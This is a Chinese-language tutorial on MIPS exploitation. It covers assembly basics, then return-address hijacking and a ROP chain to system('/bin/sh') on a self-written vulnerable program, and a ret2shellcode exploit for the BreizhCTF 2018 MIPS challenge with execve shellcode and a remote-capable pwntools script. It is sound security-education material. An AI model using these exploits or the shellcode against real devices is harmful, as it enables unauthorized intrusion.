# MIPS 汇编基础 
1. 寄存器

| 寄存器   | 功能   | 
|:----|:----|
| $v0 ~ $v1   | 保存表达式或函数返回结果   | 
| $a0 ~ $a3   | 函数前4个参数   | 
| $ra    | 返回地址   | 
| $fp   | 保存栈指针   | 
| $sp   | 栈顶指针   | 
| $gp   | 全局指针 存取静态变量   | 

# 2. load/store 指令
* l 开头的加载指令，从存储器中读取数据
* s开头的存储指令，将数据保存到存储器中

LA (将地址保存到寄存器中) : la $t0,label_1  将label_1 地址保存到寄存器中

Li (将立即数保存到寄存器中) : li $t1 ,40    将40 保存到寄存器$t1中

LW (从指定地址加载一个dword型到寄存器中) : lw $s0,0($sp)  等于 $s0 = [$sp+0]

SW (将寄存器存入指定地址) : sw $a0,0($sp) 等于 [$sp+0] = $s0  存入word 大小

MOVE(寄存器之间的传递) ： move $t1,$t2;  $t1=$t2

# 3. 跳转指令
j target  ：无条件跳转

jr $t3    ：跳转到$t3 处

jal target  ：跳转到target , 保存返回地址到$ra 

子函数调用 jal sub_routine_label : 先保存返回地址到$ra  再跳转到子函数

子函数返回 jr $ra : 直接跳到之前保存的返回地址处

环境搭建

apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu

# level 0 劫持返回地址
编写程序mips.c

```
#include<stdio.h>
int fun(){
    system("id");
}
void main(){
    char buf[100];
    read(0,buf,200);  // overflow
}
```
编译
```
mips-linux-gnu-gcc mips.c -o mips -static
```
使用IDA 查看反汇编代码如下 

```
var_78= -0x78
buf= -0x70
var_8= -8
var_4= -4
addiu   $sp, -0x88                 ； $sp = $sp -0x88
sw      $ra, 0x88+var_4($sp)       ；  [$sp-4+0x88] = $ra
sw      $fp, 0x88+var_8($sp)       ；  [$sp-8+0x88] = $fp
move    $fp, $sp                    ； $fp = $sp 
li      $gp, 0x4271F0             
sw      $gp, 0x88+var_78($sp)      ； [$sp - 0x78 +0x88] = 0x4271F0
li      $a2, 0xC8                   ; $a2 = 0xc8
addiu   $v0, $fp, 0x88+buf            
move    $a1, $v0                    ；$a1 = $fp +0x18
move    $a0, $zero                  ; $a0 = 0
la      $v0, read                    
move    $t9, $v0                     ; $t9 = read                    
bal     read                         ; read(0,$fp+0x18,0xc8)
nop
lw      $gp, 0x88+var_78($fp)        ; $gp = $fp+0x18
nop
move    $sp, $fp                      ; $sp = $fp
lw      $ra, 0x88+var_4($sp)          ; 恢复栈中$ra 和$fp
lw      $fp, 0x88+var_8($sp)
addiu   $sp, 0x88                      ; $sp = $sp +0x88
jr      $ra                           ; 跳转到$ra 的地址
nop
```
read函数输入的位置$sp+0x18 , $ra 返回地址保存在 $sp +0x84 , 输入长度为0xc8 ，可以覆盖$ra 为fun函数的地址 。 

offset = 0x84 - 0x18 =0x6c

# 调试程序
使用qemu 启动程序 

/usr/bin/qemu-mips-static ./mips

也可以使用qemu 指定调试端口

```
/usr/bin/qemu-mips-static -g 1234 ./mips
```
gdbsc脚本

```
set endian big
set arch mips
target remote 127.0.0.1:1234
```
启动gdb调试 

```
gdb-multiarch -x ./gdbsc
b *0x0400474
```
# 漏洞利用
使用pwntools 编写exp 和往常有些不同，process启动程序要带上qemu的参数 

exp.py 

```
from pwn import *
context.update(os="linux",bits = "32",arch="mips",endian="big",terminal=["tmux","splitw","-h"])
p = process(["/usr/bin/qemu-mips-static","-g","1234 ","./mips"])
fun = 0x400420
p1 = "A"*0x6c+p32(fun)
p.sendline(p1)
```
p.interactive()


![图片](https://uploader.shimo.im/f/QDZgwAc9bBEsh7wb.png!thumbnail)

运行结果

# level 1 构造参数
之前劫持返回地址到fun函数，但是不能获得shell 。这次尝试直接调用system 函数，并让参数为/bin/sh . mips 参数在a0 寄存器中，因此需要查找gadget 设置a0寄存器 为 /bin/sh 地址。

使用IDA 的mipsrop 插件查找gadget , 载入后执行插件，在命令行输入 mipsrop.find("lw $a0") 

查找能从栈中加载到$a0 的gadget 

![图片](https://uploader.shimo.im/f/SL8jjiuEGNoYKnX3.png!thumbnail)

选择0x0041B724处的gadget 

```
|  0x0041B724  |  lw $a0,0x30+var_10($sp)  |  jr    0x30+var_4($sp)               
```
![图片](https://uploader.shimo.im/f/ItwrN8Qri6ACMXx6.png!thumbnail)

在选择gadget时要考虑到sw 类指令能否成功执行，例如 sw $a1,0($s0) 是将$a1 内容存储到$s0 内的地址中，此时$s0 中需要放置一个合法地址，否则就会崩溃。 但是上图gadget 不需要

# 编写exp
需要注意的一点是$sp 地址的变化，在main函数结尾有如下代码 

![图片](https://uploader.shimo.im/f/zqcJPpwnrXEdtvcS.png!thumbnail)

为了恢复栈帧，$sp = $sp +0x88 , 因此在gadget 中参考的$sp 是调整后$sp 

![图片](https://uploader.shimo.im/f/G6J86x90RT8M9hsr.png!thumbnail)

exp2.py 

```
#coding=utf-8
from pwn import *
context.update(os="linux",bits = "32",arch="mips",endian="big",terminal=["tmux","splitw","-h"])
p = process(["/usr/bin/qemu-mips-static","-g","1234 ","./mips"])
sys = 0x040868C
sh = 0x0474D40
gadget1 =  0x0041B724
# |  0x0041B724  |  lw $a0,0x30+var_10($sp)  |  jr    0x30+var_4($sp)
# start $sp+0x18
# $a0 $sp+0x20+0x88 
# sys  = $sp+0x2c+0x88
p1 = ""
p1 = p1.ljust(0x6c,"a")+p32(gadget1)
p1 = p1.ljust(0x20+0x88-0x18 ,"a")+p32(sh)
p1 = p1.ljust(0x2c+0x88-0x18 ,"a")+p32(sys)
p.sendline(p1)
p.interactive()
```
# level2 : shellcode利用 
如果程序没有NX保护，可以ret2shellcode ，这里用一道题目举例

# BreizhCTF 2018 - MIPS
checksec  vuln 

![图片](https://uploader.shimo.im/f/UTq6HwQw9pooVjGL.png!thumbnail)

mips 小端序 ，没有保护 ，程序静态链接

题目给出了源码

![图片](https://uploader.shimo.im/f/OPW2Vvz2TR48aWUE.png!thumbnail)

接收1023 字节, request[1024] 没有溢出 

handle_client 函数

![图片](https://uploader.shimo.im/f/VM23GnY9V54wUz9V.png!thumbnail)

输入 GET url  , 程序处理传入的url参数，此处局部变量 url[32]  传入urldecode 函数

```
void urldecode(char *dst, const char *src)
{
  char a, b;
  while (*src) {
    if (*src == '%') {
      a = src[1];
      b = src[2];
      if (isxdigit(a) && isxdigit(b)) {
        if (a >= 'a')
          a -= 'a'-'A';
        if (a >= 'A')
          a -= ('A' - 10);
        else
          a -= '0';
        if (b >= 'a')
          b -= 'a'-'A';
        if (b >= 'A')
          b -= ('A' - 10);
        else
          b -= '0';
        *dst++ = 16*a+b;
      }
      src+=3;
    } else if (*src == '+') {
      *dst++ = ' ';
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst++ = '\0';
}
```
urldecode 函数处理了url编码，没有%和+ 时直接赋值给dst 。 其中没有考虑到dst 的大小，造成栈溢出 。
只要src 不是\x00 就一直复制

```
while (*src) {
  *dst++=*src++;
}
```
执行到urldecode的前提条件是
```
    if (strlen(request + 4) < sizeof(url)) {
```
字符串长度不能超过url 长度 ，不能直接造成溢出。
```
if (*src == '%') {
      a = src[1];
      b = src[2];
      if (isxdigit(a) && isxdigit(b)) {
        [...]
      }
      src+=3;
```
isxdigit() 用来检测一个字符是否是十六进制数字。如果不是src+=3 直接跳过。
构造  

```
"GET %\x00X" + "AAAAAAAAAAAAAAAAAAA" + "\x00"
```
* 第一个\x00 即可绕过长度校验 ，url长度为1 
* 将\x00 放在 % 之后 src+=3  跳过 while(*src) 的校验

以上两条构成栈溢出 

## 探测偏移
编写exp

```
from pwn import *
context.update(os="linux",bits = "32",arch="mips",endian="little",terminal=["tmux","splitw","-h"])
p = process(["/usr/bin/qemu-mipsel-static","-g","1234 ","./vuln"])
p2 = "GET %\x00X"+cyclic(1000)
p.sendline(p2)
p.interactive()
```
运行gdb
```
root@ubuntu:# gdb-multiarch -x ./gdbsc ca^C
root@ubuntu:# cat gdbsc
set endian little
set arch mips
target remote 127.0.0.1:1234
b *0x0400BB8
```
![图片](https://uploader.shimo.im/f/S1ndLw79GT0N319r.png!thumbnail) 

偏移为36 

使用shellcode

![图片](https://uploader.shimo.im/f/M7meShi7Z3UQ5jfq.png!thumbnail)

[http://shell-storm.org/shellcode/files/shellcode-80.php](http://shell-storm.org/shellcode/files/shellcode-80.php)

从gdb中读取固定的栈地址 

编写exp如下 

![图片](https://uploader.shimo.im/f/dO6FA5z5bLYPNgSo.png!thumbnail)

addr 处应该存放 0x76fff1ac

exp.py


```
from pwn import *
context.update(os="linux",bits = "32",arch="mips",endian="little",terminal=["tmux","splitw","-h"])
p = process(["/usr/bin/qemu-mipsel-static","-g","1234 ","./vuln"])
addr = 0x76fff1ac
shellcode="\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh\x00"
p2 = "GET %\x00X"+cyclic(1000)
p1 = "GET %\x00X"+"a"*36+p32(addr)+shellcode
p.sendline(p1)
p.interactive()
```
## 系统模式
下载打包好的镜像 mipsel 

[https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA](https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA)

在 start.sh 中多指定了一个端口用于gdb调试

```
#!/bin/bash
KERNEL=./vmlinux-4.9.0-3-4kc-malta
#INITRD=./initrd.gz
INITRD=./initrd.img-4.9.0-3-4kc-malta
HDD=./disk.qcow2
SSH_PORT=22044
EXTRA_PORT=33044
qemu-system-mipsel -M malta -m 512 \
                   -kernel ${KERNEL} \
                   -initrd ${INITRD} \
                   -hda ${HDD} \
                   -net nic,model=e1000 \
                   -net user,hostfwd=tcp:127.0.0.1:${SSH_PORT}-:22,hostfwd=tcp:127.0.0.1:${EXTRA_PORT}-:4444,hostfwd=tcp:127.0.0.1:5555-:5555\
                   -display none -vga none -nographic \
                   -append 'nokaslr root=/dev/sda1 console=ttyS0'
exit 0
```
关闭ASLR 
```
echo 0 > /proc/sys/kernel/randomize_va_space
```
配置xinetd服务
```
root@debian-mipsel:/home/user# cat /etc/xinetd.d/xpwn
service xpwn
{
    disable = no
    type = UNLISTED
    flags = REUSE
    wait = no
    socket_type = stream
    protocol = tcp
    bind = 0.0.0.0
    rlimit_cpu = 60
    port = 4444
    user = user
    group = user
    server = /home/user/vuln
}
```
使用[gdbserver](https://github.com/akpotter/embedded-toolkit/blob/master/prebuilt_static_bins/gdbserver/gdbserver-7.7.1-mipsel-ii-v1) 远程调试
```
./gdbserver-7.7.1-mipsel-ii-v1 :5555 ./vuln
```
gdbsc
```
set endian little
set arch mips
file vuln
target remote 127.0.0.1:5555
b *0x0400BB8
```
```
gdb-multiarch -x ./gdbsc
```
## 如何让exp和gdb一起调试
在调试exp的时候，希望查看exp的实际运行情况，步骤如下

* 先设置addr 为 0xaaaaaaaa ， 发送payload 前 pause() 暂停程序 , 执行exp.py 程序暂停

![图片](https://uploader.shimo.im/f/lTLhPu4sTHU2dSa1.png!thumbnail)

* 从靶机中查找 目标pid

![图片](https://uploader.shimo.im/f/FdFifsIHTV8wfgIH.png!thumbnail)

* gdbserver 连接目标程序

![图片](https://uploader.shimo.im/f/NZ8750omQZwNaIX0.png!thumbnail)

* 回到宿主机  gdb-multiarch -x ./gdbsc   ， gdbsc 内容同上
* 继续执行 exp.py  

![图片](https://uploader.shimo.im/f/WCKP0Nt2zpU7pRh3.png!thumbnail)

![图片](https://uploader.shimo.im/f/ZBTMJ1kqnw4Tihq4.png!thumbnail)

定位到shellcode 地址为 0x7fffe934+36+4

完整exp如下

```
#coding=utf-8
from pwn import *
import sys
context.update(log_level="debug",os="linux",bits = "32",arch="mips",endian="little",terminal=["tmux","splitw","-h"])
if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    addr = 0x7fffe934+36+4
else:
    p = process(["/usr/bin/qemu-mipsel-static","-g","1234 ","./vuln"])
    addr = 0x76fff1ac
shellcode="\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh\x00"
p2 = "GET %\x00X"+cyclic(1000)
p1 = "GET %\x00X"+"a"*36+p32(addr)+shellcode
pause()
p.recvline()
p.sendline(p1)
p.interactive()
```
参考 
[https://www.aperikube.fr/docs/breizhctf_2018/mips/](https://www.aperikube.fr/docs/breizhctf_2018/mips/)

More 

[https://blog.orange.tw/2012/06/defcon-ctf-20-qual-pp100-writeup.html](https://blog.orange.tw/2012/06/defcon-ctf-20-qual-pp100-writeup.html)

# level3 ： heap
嵌入式设备大多使用uClibc ，是glibc 的精简版，相关的堆分配策略和glibc不一样。

uclibc 下载地址

[https://www.uclibc.org/downloads/](https://www.uclibc.org/downloads/)

之前分析的DIR645 就使用了uClibc-0.9.30 版本

malloc相关文件在/libc/stdlib/中，包含了三种堆实现 

* malloc  
* malloc-standard  移植的dlmalloc 
* malloc-simple

下载后编译就可以发现默认使用malloc-standard

![图片](https://uploader.shimo.im/f/EusTyl8gUP0jZ0gW.png!thumbnail)


参考

[https://xz.aliyun.com/t/1513](https://xz.aliyun.com/t/1513)

[https://kirin-say.top/2019/06/20/TCTF-Finals-2019-Embedded-heap](https://kirin-say.top/2019/06/20/TCTF-Finals-2019-Embedded-heap/#Exec-Environment)

 

